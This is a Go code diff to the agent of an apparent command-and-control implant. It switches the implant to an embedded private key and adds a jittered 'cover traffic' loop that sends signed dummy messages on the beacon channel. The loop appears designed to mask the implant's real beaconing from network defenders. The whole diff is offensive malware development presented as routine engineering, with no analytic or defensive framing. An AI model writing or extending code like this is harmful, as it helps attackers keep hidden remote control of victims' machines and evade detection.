@@ -41,6 +41,9 @@ type AgentConfig struct {
 	BeaconJitter     time.Duration
 	ReconnectBackoff time.Duration
 	RelayAddrs       []string
+	CoverTraffic     bool
+	CoverInterval    time.Duration
+	CoverJitter      time.Duration
 }
 
 func DefaultAgentConfig() AgentConfig {
@@ -48,6 +51,9 @@ func DefaultAgentConfig() AgentConfig {
 		BeaconInterval:   10 * time.Second,
 		BeaconJitter:     5 * time.Second,
 		ReconnectBackoff: 5 * time.Second,
+		CoverTraffic:     true,
+		CoverInterval:    4 * time.Second,
+		CoverJitter:      3 * time.Second,
 	}
 }
 
@@ -56,6 +62,26 @@ func loadOperatorPubKey() (crypto.PubKey, error) {
 		return nil, fmt.Errorf("no embedded operator public key — rebuild with build-implant tool")
 	}
 	return cryptography.PubKeyFromBytes(embeddedOperatorPubKey)
+}
+
+func loadImplantKey(operatorPub crypto.PubKey) (*cryptography.ImplantKey, error) {
+	if len(embeddedImplantPrivKey) == 0 {
+		return nil, fmt.Errorf("no embedded implant private key — rebuild with arachne generate")
+	}
+	priv, err := cryptography.LoadPrivateKey(embeddedImplantPrivKey)
+	if err != nil {
+		return nil, fmt.Errorf("unmarshal implant key: %w", err)
+	}
+	pub := priv.GetPublic()
+	pid, err := peer.IDFromPublicKey(pub)
+	if err != nil {
+		return nil, fmt.Errorf("peer id from implant key: %w", err)
+	}
+	return &cryptography.ImplantKey{
+		KeyPair:        cryptography.KeyPair{PrivateKey: priv, PublicKey: pub},
+		PeerID:         pid,
+		OperatorPubKey: operatorPub,
+	}, nil
 }
 
 func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
@@ -67,10 +93,10 @@ func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
 		return nil, fmt.Errorf("load operator pubkey: %w", err)
 	}
 
-	keys, err := cryptography.GenerateImplantKey(operatorPub)
+	keys, err := loadImplantKey(operatorPub)
 	if err != nil {
 		cancel()
-		return nil, fmt.Errorf("generate implant key: %w", err)
+		return nil, fmt.Errorf("load implant key: %w", err)
 	}
 
 	nodeCfg := transport.NodeConfig{
@@ -146,6 +172,10 @@ func (a *Agent) Start() error {
 
 	go a.beaconLoop()
 
+	if a.config.CoverTraffic {
+		go a.coverTrafficLoop()
+	}
+
 	return nil
 }
 
@@ -207,6 +237,29 @@ func (a *Agent) beaconLoop() {
 			return
 		case <-time.After(sleep):
 		}
+	}
+}
+
+func (a *Agent) coverTrafficLoop() {
+	for {
+		jitter := time.Duration(rand.Int63n(int64(a.config.CoverJitter)))
+		sleep := a.config.CoverInterval + jitter
+
+		select {
+		case <-a.ctx.Done():
+			return
+		case <-time.After(sleep):
+		}
+
+		a.sendCoverTraffic()
+	}
+}
+
+func (a *Agent) sendCoverTraffic() {
+	env := a.messenger.CreateEnvelope(transport.MsgTypeCover, nil)
+	topic := a.messenger.BeaconTopic()
+	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
+		log.Printf("[implant] cover traffic: %v", err)
 	}
 }
 
